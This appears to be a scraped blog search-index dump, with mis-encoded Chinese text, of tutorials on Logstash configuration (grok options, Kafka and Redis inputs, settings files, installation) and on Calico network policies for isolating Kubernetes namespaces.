\"logstash01\", \"@version\" =\u003e \"1\" } ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:1","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"match ç±»å‹: hash é»˜è®¤å€¼: {} æè¿°: å®šä¹‰ä¸æ—¥å¿—åŒ¹é…çš„æ­£åˆ™ï¼Œå­—æ®µåç§° ä¾‹å¦‚ï¼š filter { grok { match =\u003e { \"message\" =\u003e \"Duration: %{NUMBER:duration}\" } } } ä¹Ÿå¯ä»¥ä½¿ç”¨å¤šç»„æ­£åˆ™è¡¨è¾¾å¼,å¦‚ä¸‹ï¼š filter{ grok{ match=\u003e{ \"message\"=\u003e[ \"Duration: %{NUMBER:duration} Data: %{DATA:data}\\|\", \"Speed: %{NUMBER:speed} Data: %{DATA:data}\\|\" ] } } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:2","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"break_on_match ç±»å‹: boolean é»˜è®¤å€¼: true æè¿°: å¦‚æœæœ‰å¤šç»„æ­£åˆ™çš„è¯ï¼ŒæˆåŠŸåŒ¹é…ä¸€ç»„æ­£åˆ™å°±ä¼šåœæ­¢åŒ¹é…ã€‚å¦‚æœè®¾ç½®ä¸ºfalse,å°†ä¼šæŠŠæ¯ç»„çš„æ­£åˆ™è¿›è¡ŒåŒ¹é…ã€‚ä¾‹å¦‚ æ­£åˆ™: [\"Duration: %{NUMBER:duration} Data: %{DATA:data}\\|\",\"Duration: %{NUMBER:sudu} Data: %{DATA:data}\\|\"] æ—¥å¿—: Duration: 120 Data: asdasd| ç»“æœ: { \"sudu\" =\u003e \"120\", \"@timestamp\" =\u003e 2021-04-01T02:53:43.651Z, \"duration\" =\u003e \"120\", \"data\" =\u003e [ [0] \"asdasd\", [1] \"asdasd\" ], \"message\" =\u003e \"Duration: 120 Data: asdasd|\", \"host\" =\u003e \"ops-elk-es01\", \"@version\" =\u003e \"1\" } ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:3","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"named_captures_only ç±»å‹: boolean é»˜è®¤å€¼: true æè¿°: å¦‚æœè®¾ç½®ä¸ºtrue,æ­£åˆ™åŒ¹é…å¦‚æœæ²¡æœ‰æŒ‡å®šå­—æ®µåç§°ï¼Œåˆ™åŒ¹é…åˆ°çš„å†…å®¹ä¸ä¼šæ·»åŠ åˆ°äº‹ä»¶ä¸­ã€‚è®¾ç½®ä¸ºfalseï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯é¢„å®šä¹‰æ­£åˆ™ï¼Œæ­£åˆ™åç§°å°†ä½œä¸ºå­—æ®µå ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:4","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"overwrite ç±»å‹: array é»˜è®¤å€¼: [] æè¿°: æŒ‡å®šè¦è¦†ç›–çš„å­—æ®µåç§°ã€‚å¦‚æœä¸æŒ‡å®šï¼Œåœ¨å­—æ®µåå†²çªçš„æƒ…å†µä¸‹ï¼ŒåŒ¹é…å†…å®¹å°†ä¼šä½œä¸ºæ•°ç»„çš„ä¸€ä¸ªå…ƒç´ åŠ å…¥åˆ°å­—æ®µä¸­ã€‚ ä¾‹å¦‚: æ—¥å¿—å†…å®¹: May 29 16:37:11 sadness logger: hello world filter { grok { match =\u003e { \"message\" =\u003e \"%{SYSLOGBASE} %{DATA:message}\" } overwrite =\u003e [ \"message\" ] } } æœ€åçš„ç»“æœä¸­äº‹ä»¶çš„messageå­—æ®µçš„å†…å®¹æ˜¯hello world ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:5","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"pattern_definitions ç±»å‹: hash é»˜è®¤å€¼: {} æè¿°: å®šä¹‰æ­£åˆ™ ä¾‹å¦‚: pattern_definitions =\u003e {\"mypattern\" =\u003e \"\\d+|%{DATA:data}\"} ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:6","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"patterns_dir ç±»å‹: array é»˜è®¤å€¼: [] æè¿°: æŒ‡å®šé¢„å®šä¹‰æ­£åˆ™çš„è·¯å¾„ï¼Œå°†ä»è¿™ä¸ªè·¯å¾„ä¸‹çš„æ–‡ä»¶ä¸­å¯»æ‰¾é¢„å®šä¹‰æ­£åˆ™ ä¾‹å¦‚: patterns_dir =\u003e [\"/opt/logstash/patterns\", \"/opt/logstash/extra_patterns\"] é¢„å®šä¹‰æ­£åˆ™çš„æ ¼å¼:NAME PATTERNã€‚ä¾‹å¦‚:NUMBER \\d+ ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:7","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"patterns_files_glob ç±»å‹: string é»˜è®¤å€¼: * æè¿°: æŒ‡å®špatterns_diré…ç½®çš„ç›®å½•ä¸­å“ªäº›æ–‡ä»¶æ˜¯å¯ä»¥ä½¿ç”¨çš„ ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:8","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"tag_on_failure ç±»å‹: array é»˜è®¤å€¼: [\"_grokparsefailure\"] æè¿°: æ­£åˆ™åŒ¹é…å¤±è´¥æ—¶,ä¼šåœ¨tagså­—æ®µä¸­è¿½åŠ ä¸€ä¸ªæ ‡ç­¾ï¼Œè¿™é‡Œé…ç½®çš„æ˜¯æ ‡ç­¾åç§° ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:9","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"tag_on_timeout ç±»å‹: string é»˜è®¤å€¼: â€œ_groktimeoutâ€ æè¿°: å¦‚æœæ­£åˆ™åŒ¹é…è¶…æ—¶ï¼Œåˆ™åº”ç”¨æ ‡è®° ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:10","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"target ç±»å‹: string é»˜è®¤å€¼: æ—  æè¿°: å®šä¹‰ç”¨äºæ”¾ç½®åŒ¹é…é¡¹çš„namespace ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:11","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"timeout_millis ç±»å‹: number é»˜è®¤å€¼: 30000 æè¿°: åŒ¹é…çš„è¶…æ—¶æ—¶é—´ã€‚é’ˆå¯¹å•ç»„æ­£åˆ™ã€‚ ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:12","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‰ã€å…¬å…±é€‰é¡¹ ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:0","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"add_field ç±»å‹: hash é»˜è®¤å€¼: {} æè¿°: åœ¨äº‹ä»¶ä¸­æ·»åŠ å­—æ®µ filter { grok { add_field =\u003e { \"foo_%{somefield}\" =\u003e \"Hello world, from %{host}\" \"new_field\" =\u003e \"new_static_value\" } } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:1","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"add_tag ç±»å‹: array é»˜è®¤å€¼: [] æè¿°: åœ¨äº‹ä»¶ä¸­æ·»åŠ tag filter { grok { add_tag =\u003e [ \"foo_%{somefield}\", \"taggedy_tag\"] } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:2","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"enable_metric ç±»å‹: boolean é»˜è®¤å€¼: true æè¿°: æ˜¯å¦å¯ç”¨å½“å‰æ’ä»¶çš„metric ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:3","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"id ç±»å‹: string é»˜è®¤å€¼: æ—  æè¿°: å‘æ’ä»¶é…ç½®æ·»åŠ å”¯ä¸€çš„IDã€‚å¦‚æœæœªæŒ‡å®šIDï¼ŒLogstashå°†ç”Ÿæˆä¸€ä¸ªã€‚å¼ºçƒˆå»ºè®®åœ¨é…ç½®ä¸­è®¾ç½®æ­¤IDã€‚å½“æ‚¨æœ‰ä¸¤ä¸ªæˆ–æ›´å¤šç›¸åŒç±»å‹çš„æ’ä»¶æ—¶ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æœ‰ä¸¤ä¸ªgrokè¿‡æ»¤å™¨ï¼‰ï¼Œè¿™ä¸€ç‚¹ç‰¹åˆ«æœ‰ç”¨ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ·»åŠ ä¸€ä¸ªå‘½åIDå°†æœ‰åŠ©äºåœ¨ä½¿ç”¨monitor apiæ—¶ç›‘è§†logstashã€‚ ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:4","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"periodic_flush ç±»å‹: boolean é»˜è®¤å€¼: false æè¿°: å®šæœŸè°ƒç”¨filter flushæ–¹æ³•ã€‚ ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:5","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"remove_field ç±»å‹: array é»˜è®¤å€¼: [] æè¿°: åˆ é™¤å­—æ®µ filter { grok { remove_field =\u003e [ \"foo_%{somefield}\", \"my_extraneous_field\" ] } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:6","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"remove_tag ç±»å‹: array é»˜è®¤å€¼: [] æè¿°: åˆ é™¤tag filter { grok { remove_tag =\u003e [ \"foo_%{somefield}\", \"sad_unwanted_tag\"] } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:7","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®fileteræ’ä»¶ä¹‹grok(å››)","uri":"/post/2299/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æ‰€æœ‰inputæ’ä»¶å‡æ”¯æŒçš„å‚æ•° add_field: åœ¨äº‹ä»¶ä¸­æ·»åŠ å±æ€§ã€‚æ ¼å¼{\"name\" =\u003e \"zhangsan\" \"age\" =\u003e \"11\"} codec: æŒ‡å®šç¼–è§£ç å™¨ï¼Œé»˜è®¤plain enable_metric: æ˜¯å¦å¯ç”¨æŒ‡æ ‡æ—¥å¿—ï¼Œé»˜è®¤true id: é…ç½®æ’ä»¶IDã€‚å¦‚æœæ²¡æœ‰æŒ‡å®šID, Logstashå°†ç”Ÿæˆä¸€ä¸ªã€‚å¼ºçƒˆå»ºè®®åœ¨æ‚¨çš„é…ç½®ä¸­è®¾ç½®æ­¤IDã€‚å½“ä½ æœ‰ä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šç›¸åŒç±»å‹çš„æ’ä»¶æ—¶ï¼Œè¿™æ˜¯ç‰¹åˆ«æœ‰ç”¨çš„ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æœ‰ä¸¤ä¸ªkafka inputé…ç½®ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ·»åŠ IDå°†æœ‰åŠ©äºåœ¨ä½¿ç”¨monitoring APIsæ—¶ ç›‘æ§Logstashã€‚ tags: æ·»åŠ æ ‡ç­¾ã€‚æ ¼å¼[\"test\", \"ok\"] type: å‘äº‹ä»¶ä¸­æ·»åŠ typeå­—æ®µï¼Œå€¼æ˜¯string è¿™é‡Œä»‹ç»ä¸¤ç§inputç±»å‹çš„æ’ä»¶ï¼Œåˆ†åˆ«æ˜¯kafkaå’Œredis ","date":"2021-03-25 13:04","objectID":"/post/2288/:0:0","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®ç®¡é“input(ä¸‰)","uri":"/post/2288/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"1. kafka ä½¿ç”¨kafkaä½œä¸ºinputï¼Œéœ€è¦å®‰è£…kafkaæ’ä»¶bin/logstash-plugin install logstash-input-kafkaã€‚ kafkaå¯ä»¥æ’ä»¶ä»Kafka topicä¸­è¯»å–äº‹ä»¶ã€‚ é…ç½®å‚æ•° bootstrap_servers: kafkaå®ä¾‹çš„åœ°å€åˆ—è¡¨ topics: topicåˆ—è¡¨ã€‚é»˜è®¤[â€œlogstashâ€] topics_pattern: ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…topic connections_max_idle_ms: åœ¨æŒ‡å®šçš„æ¯«ç§’æ•°ä¹‹åå…³é—­ç©ºé—²è¿æ¥ã€‚ consumer_threads: çº¿ç¨‹æ•°é‡ï¼Œæœ€å¥½ä¸kafkaåˆ†ç‰‡æ•°é‡æƒ³åŒ decorate_events: æ˜¯å¦åœ¨äº‹ä»¶ä¸­æ·»åŠ kafkaå…ƒæ•°æ®ã€‚å¯ä»¥æä¾›ç»™è¿‡æ»¤å™¨ä½¿ç”¨ã€‚å…ƒæ•°æ®åŒ…æ‹¬topicã€consumer_groupã€partitionã€offsetã€key å…¶ä»–å‚æ•°: https://www.elastic.co/guide/en/logstash/6.8/plugins-inputs-kafka.html#plugins-inputs-kafka-options é…ç½®ç¤ºä¾‹: input { kafka { add_field =\u003e { \"service\" =\u003e \"gateway\" \"env\" =\u003e \"test\" } tags =\u003e [\"test\",\"ok\"] bootstrap_servers =\u003e [\"localhost:9092\"] topics =\u003e [\"soulchild-test\"] codec =\u003e json consumer_threads =\u003e 2 } } output { elasticsearch { hosts =\u003e [\"http://es-01:9200\", \"http://es-02:9200\", \"http://es-03:9200\"] index =\u003e \"kafka-test-%{+YYYY.MM.dd}\" } } ","date":"2021-03-25 13:04","objectID":"/post/2288/:0:1","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®ç®¡é“input(ä¸‰)","uri":"/post/2288/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"2.redis ä½¿ç”¨redisä½œä¸ºinputï¼Œéœ€è¦å®‰è£…redisæ’ä»¶bin/logstash-plugin install logstash-input-redis é…ç½®å‚æ•° batch_count: EVALå‘½ä»¤è¿”å›çš„äº‹ä»¶æ•°,é»˜è®¤125ï¼Œæ¯æ¬¡ä»redisè·å–125ä¸ªäº‹ä»¶ data_type: list,channel,pattern_channel db: redis dbç¼–å· host: redisè¿æ¥ä¸»æœº path: redis socketè·¯å¾„ key: redisè®¢é˜…é€šé“åç§°æˆ–è€…listçš„keyåç§° password: rediså¯†ç  port: redisç«¯å£å· ssl: å¯ç”¨ssl threads: çº¿ç¨‹æ•°ï¼Œé»˜è®¤1 timeout: åˆå§‹è¿æ¥è¶…æ—¶(ç§’) command_map: å¦‚æœrediså‘½ä»¤è¢«é‡å‘½åï¼Œè¿™é‡Œå¯ä»¥é…ç½®redisåŸå§‹å‘½ä»¤çš„æ˜ å°„ï¼Œä¾‹å¦‚ï¼š command_map =\u003e { \"lpush\" =\u003e \"newlpush\" } é…ç½®ç¤ºä¾‹: input { redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"1.1.1.1\" key =\u003e \"test-log\" } } output { elasticsearch { hosts =\u003e [\"http://es-01:9200\", \"http://es-02:9200\", \"http://es-03:9200\"] index =\u003e \"redis-test-%{+YYYY.MM.dd}\" } } ","date":"2021-03-25 13:04","objectID":"/post/2288/:0:2","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®ç®¡é“input(ä¸‰)","uri":"/post/2288/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"logstash.yml logstashå…¨å±€å±æ€§ã€å¯åŠ¨ã€æ‰§è¡Œç›¸å…³é…ç½® node.name: èŠ‚ç‚¹çš„æè¿°åç§°ï¼Œé»˜è®¤æ˜¯ä¸»æœºå path.data: Logstashæ’ä»¶åŠç”¨äºæŒä¹…åŒ–çš„ç›®å½•,é»˜è®¤LOGSTASH_HOME/data pipeline.id: pipelineçš„idï¼Œé»˜è®¤main pipeline.java_execution: ä½¿ç”¨javaæ‰§è¡Œå¼•æ“ï¼Œé»˜è®¤false path.logs: æ—¥å¿—å­˜æ”¾è·¯å¾„ï¼Œé»˜è®¤LOGSTASH_HOME/logs log.level: æ—¥å¿—çº§åˆ«ï¼Œfatalï¼Œerrorï¼Œwarnï¼Œinfoï¼Œdebugï¼Œtraceï¼Œé»˜è®¤info config.debug: æ˜¯å¦ä¸ºè°ƒè¯•æ¨¡å¼ï¼Œé»˜è®¤false path.config: logstashç®¡é“é…ç½®æ–‡ä»¶è·¯å¾„ pipeline.workers: æ‰§è¡Œç®¡é“çš„è¿‡æ»¤å™¨å’Œè¾“å‡ºé˜¶æ®µçš„å·¥ä½œçº¿ç¨‹æ•°é‡ã€‚é»˜è®¤CPUæ ¸å¿ƒæ•° pipeline.batch.size: ä¸€ä¸ªå·¥ä½œçº¿ç¨‹å¯ä»¥æ‰§è¡Œçš„æœ€å¤§äº‹ä»¶æ•° å…¶ä»–å‚æ•°: https://www.elastic.co/guide/en/logstash/6.8/logstash-settings-file.html ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:1","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®æ–‡ä»¶(äºŒ)","uri":"/post/2290/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"pipelines.yml åœ¨å•ä¸ªLogstashå®ä¾‹ä¸­è¿è¡Œå¤šä¸ªç®¡é“çš„ç›¸å…³é…ç½®. ä¾‹å¦‚ä¸‹é¢çš„é…ç½®å®šä¹‰äº†ç®¡é“idï¼Œè¿™ä¸ªç®¡é“ä½¿ç”¨çš„é˜Ÿåˆ—ç±»å‹ï¼Œè¿™ä¸ªç®¡é“ä»å“ªé‡Œè¯»å–é…ç½®æ–‡ä»¶ - pipeline.id: another_test queue.type: persisted path.config: \"/tmp/logstash/*.config\" ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:2","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®æ–‡ä»¶(äºŒ)","uri":"/post/2290/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"jvm.options é…ç½®logstashçš„jvmå‚æ•° ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:3","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®æ–‡ä»¶(äºŒ)","uri":"/post/2290/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"log4j2.properties log4j2çš„ç›¸å…³é…ç½® ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:4","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®æ–‡ä»¶(äºŒ)","uri":"/post/2290/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"startup.options (Linux) ä¿®æ”¹æ­¤é…ç½®ï¼Œåœ¨ä½¿ç”¨bin/system-installï¼Œå¯ä»¥ä½¿äºŒè¿›åˆ¶å®‰è£…çš„logstashï¼Œä¹Ÿæ”¯æŒsystemdç®¡ç† ä¾‹å¦‚: ./system-install /usr/local/logstash-6.8.9/config/startup.options systemd ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:5","tags":["elk","logstash"],"title":"ELK-logstashé…ç½®æ–‡ä»¶(äºŒ)","uri":"/post/2290/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€äºŒè¿›åˆ¶å®‰è£… # ä¸‹è½½ wget https://artifacts.elastic.co/downloads/logstash/logstash-6.8.9.tar.gz # å®‰è£… tar xf logstash-6.8.9.tar.gz mv logstash-6.8.9 /usr/local/ # å¯åŠ¨ /usr/local/logstash-6.8.9/bin/logstash -f logstash.conf ","date":"2021-03-24 14:04","objectID":"/post/2286/:0:1","tags":["elk","logstash"],"title":"ELK-logstashå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2286/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€yumå®‰è£… rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch cat \u003e /etc/yum.repos.d/logstash.repo \u003c\u003cEOF [logstash-6.x] name=Elastic repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md EOF yum install logstash ","date":"2021-03-24 14:04","objectID":"/post/2286/:0:2","tags":["elk","logstash"],"title":"ELK-logstashå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2286/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‰ã€logstashç®€ä»‹ logstashæ˜¯ä¸€ä¸ªç±»ä¼¼å®æ—¶æµæ°´çº¿çš„å¼€æºæ•°æ®ä¼ è¾“å¼•æ“ï¼Œå°†æ•°æ®å®æ—¶åœ°ä»ä¸€ä¸ªæ•°æ®æºä¼ è¾“åˆ°å¦ä¸€ä¸ªæ•°æ®æºä¸­ã€‚åœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­å¯ä»¥å¯¹æ•°æ®è¿›è¡Œæ¸…æ´—ã€åŠ å·¥ç­‰æ“ä½œã€‚ logstashæ•°æ®ä¼ è¾“è¿‡ç¨‹åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µâ€”â€”è¾“å…¥ã€è¿‡æ»¤ã€è¾“å‡ºã€‚åœ¨å®ç°ä¸Šï¼Œå®ƒä»¬ç”±ä¸‰ç§ç±»å‹çš„æ’ä»¶å®ç°ï¼Œå³è¾“å…¥æ’ä»¶ã€è¿‡æ»¤å™¨æ’ä»¶ã€è¾“å‡ºæ’ä»¶ã€‚é™¤äº†è¿™ä¸‰ç§å¤–è¿˜æœ‰ä¸€ä¸ªå«ç¼–è§£ç å™¨(codec)çš„æ’ä»¶ã€‚ç¼–è§£ç å™¨æ’ä»¶ç”¨äºåœ¨æ•°æ®è¿›å…¥å’Œç¦»å¼€ç®¡é“æ—¶å¯¹æ•°æ®åšè§£ç å’Œç¼–ç ï¼Œæ‰€ä»¥å®ƒä¸€èˆ¬æ˜¯å’Œè¾“å…¥ã€è¾“å‡ºæ’ä»¶ç»“åˆåœ¨ä¸€èµ·ä½¿ç”¨ã€‚ ","date":"2021-03-24 14:04","objectID":"/post/2286/:0:3","tags":["elk","logstash"],"title":"ELK-logstashå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2286/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"å››ã€é…ç½®æ–‡ä»¶çš„ç»“æ„ æ¯ä¸ªéƒ¨åˆ†åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ’ä»¶çš„é…ç½®é€‰é¡¹ã€‚å¦‚æœæ‚¨æŒ‡å®šäº†å¤šä¸ªè¿‡æ»¤å™¨ï¼Œå®ƒä»¬å°†æŒ‰ç…§å®ƒä»¬åœ¨é…ç½®æ–‡ä»¶ä¸­å‡ºç°çš„é¡ºåºåº”ç”¨ã€‚ input { ... } filter { ... } output { ... } ä¸€ä¸ªæ’ä»¶çš„é…ç½®åŒ…æ‹¬æ’ä»¶åå’Œè¯¥æ’ä»¶çš„è®¾ç½®å—ã€‚ä¾‹å¦‚ï¼Œè¿™ä¸ªinputéƒ¨åˆ†é…ç½®äº†ä¸¤ä¸ªæ–‡ä»¶è¾“å…¥: input { file { path =\u003e \"/var/log/messages\" type =\u003e \"syslog\" } file { path =\u003e \"/var/log/apache/access.log\" type =\u003e \"apache\" } } é…ç½®æ–‡ä»¶ä¸é€šæ•°æ®ç±»å‹çš„å†™æ³• array: users =\u003e [ {id =\u003e 1, name =\u003e bob}, {id =\u003e 2, name =\u003e jane} ] list: path =\u003e [ \"/var/log/messages\", \"/var/log/*.log\" ] boolean: ssl_enable =\u003e true bytes: my_bytes =\u003e \"1113\" # 1113 bytes my_bytes =\u003e \"10MiB\" # 10485760 bytes my_bytes =\u003e \"100kib\" # 102400 bytes my_bytes =\u003e \"180 mb\" # 180000000 bytes codec: codec =\u003e \"json\" hash: hashæ˜¯é”®å€¼å¯¹çš„é›†åˆï¼ŒæŒ‡å®šæ ¼å¼ä¸º\"field1\" =\u003e â€œvalue1â€ã€‚æ³¨æ„ï¼Œå¤šä¸ªé”®å€¼æ¡ç›®ç”¨ç©ºæ ¼è€Œä¸æ˜¯é€—å·åˆ†éš”ã€‚ match =\u003e { \"field1\" =\u003e \"value1\" \"field2\" =\u003e \"value2\" ... } æ¡ä»¶åˆ¤æ–­ if EXPRESSION { ... } else if EXPRESSION { ... } else { ... } æ”¯æŒä¸‹é¢è¿™äº›æ¡ä»¶æ“ä½œç¬¦ ç­‰å¼: ==, !=, \u003c, \u003e, \u003c=, \u003e= æ­£åˆ™: =~, !~ åŒ…å«: in, not in é€»è¾‘: and, or, nand, xor ","date":"2021-03-24 14:04","objectID":"/post/2286/:0:4","tags":["elk","logstash"],"title":"ELK-logstashå®‰è£…å’Œç®€ä»‹(ä¸€)","uri":"/post/2286/"},{"categories":["kubernetes"],"content":"ä¸€ã€å‡†å¤‡ç¯å¢ƒ åˆ›å»ºnamespace: pp-devã€pp-testã€kk-devã€kk-test æ¯ä¸ªnamespaceåˆ›å»ºä¸¤ä¸ªåº”ç”¨ apiVersion: apps/v1 kind: Deployment metadata: name: nginx1 #namespace: pp-test spec: selector: matchLabels: app: nginx1 template: metadata: labels: app: nginx1 author: soulchild spec: containers: - name: nginx image: nginx:1.14.2 ports: - containerPort: 80 --- apiVersion: apps/v1 kind: Deployment metadata: name: client #namespace: pp-test spec: selector: matchLabels: app: client template: metadata: labels: app: client author: soulchild spec: containers: - name: busybox image: busybox:1.33.0 args: [\"sleep\", \"1000000\"] kubectl apply -n pp-dev -f nginx.yaml kubectl apply -n pp-test -f nginx.yaml kubectl apply -n kk-dev -f nginx.yaml kubectl apply -n kk-test -f nginx.yaml é…ç½®å®Œåæµ‹è¯•ç½‘ç»œæ­£å¸¸ ","date":"2021-03-24 09:29","objectID":"/post/2273/:0:1","tags":["k8s"],"title":"k8sä½¿ç”¨calicoå®ç°ä¸åŒnamespaceç½‘ç»œéš”ç¦»","uri":"/post/2273/"},{"categories":["kubernetes"],"content":"äºŒã€é…ç½®globalnetworkpolicy å®˜æ–¹æ–‡æ¡£: https://docs.projectcalico.org/reference/resources/globalnetworkpolicy#selectors 1.ç»™namespaceæ‰“æ ‡ç­¾ kubectl label namespaces pp-dev enable-env-isolate-policy=\"true\" kubectl label namespaces pp-dev env=\"dev\" kubectl label namespaces pp-test enable-env-isolate-policy=\"true\" kubectl label namespaces pp-test env=\"test\" kubectl label namespaces kk-dev enable-env-isolate-policy=\"true\" kubectl label namespaces kk-dev env=\"dev\" kubectl label namespaces kk-test enable-env-isolate-policy=\"true\" kubectl label namespaces kk-test env=\"test\" 2.é…ç½®æ‹¥æœ‰env=devæ ‡ç­¾çš„namespaceäº’é€š apiVersion: crd.projectcalico.org/v1 kind: GlobalNetworkPolicy metadata: name: allow-label-env-dev-namesapce spec: namespaceSelector: enable-env-isolate-policy == \"true\" # ä¸æ ‡ç­¾åŒ¹é…çš„namespaceï¼Œç”Ÿæ•ˆä¸‹é¢é…ç½®çš„è§„åˆ™ order: 101 # é…ç½®ä¼˜å…ˆçº§ï¼Œè¶Šå°è¶Šå…ˆæ‰§è¡Œç­–ç•¥ ingress: # é…ç½®å…¥å£è§„åˆ™ - action: Allow # 